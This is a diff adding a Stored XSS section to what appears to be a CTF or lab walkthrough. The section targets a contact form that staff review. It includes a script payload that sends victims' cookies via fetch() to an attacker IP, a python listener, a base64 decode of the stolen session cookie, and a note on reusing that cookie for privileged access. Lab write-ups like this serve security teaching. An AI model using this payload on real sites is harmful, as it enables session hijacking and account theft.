@@ -79,6 +79,47 @@ ________________________________________________
 
 ### Stored XSS: 
 ---
+>[!Tip]
+> Take a look at the contact form 
+
+- Stored Cross-Site Scripting (XSS) occurs when user input is stored on the server and later displayed without proper sanitization 
+- This allows attackers to inject JavaScript that executes in the browser of other users.
+
+- on the home page there is a contact form 
+- above the contact-form is a message telling the user, that messages are usually reviewed within a minute
+- so we can assume that the message, that we are sending, gets stored in a database and gets displayed somewhere else on the website 
+- so we could try `Stored XSS`
+- to test it, we can try to put `JavaScript`-code into one of the three input tags and sent it 
+
+- one possible payload for this, would be this: 
+```html
+<script>fetch('http://192.168.132.187:9000/?cookie=' + btoa(document.cookie));</script> 
+```
+- so lets imagine a staff member is responsible for reviewing the messages that gets sent from the contact-form 
+- the payload uses `fetch()` to send the victim's cookie to an attacker-controlled server  
+- `btoa()` is used to Base64-encode the cookie
+
+- so first we have to start a `webserver`, to do this we can use `python`: 
+```bash
+python3 -m http.server 9000
+```
+
+- now we can craft our message in the contact-form: 
+![Stored_XSS_1](docs/images/Stored_XSS_1.png)
+- you personally have to change the `IP` to your own adress
+- now we have to wait one minute
+
+![Stored_XSS_2](docs/images/Stored_XSS_2.png)
+- as we can see we got an request with the `cookie` from an staff member
+- the `cookie` is currently `Base64` encoded, but we can decode it with: 
+```bash
+echo "c2Vzc2lvbj1leUp0YjJSbElqb2lkVzV6WldOMWNtVWlMQ0p5YjJ4bElqb2ljM1JoWm1ZaWZRLmFkVVM4dy5GcFRteWdnbm9LX18xeTd3NWJTeEtHaXJFLVE=" | base64 -d
+```
+
+```bash
+session=<Redacted>
+```
+- now we can set this cookie in our browser and have priviliged access
 
 
 ### User Enumeration + Brute Force
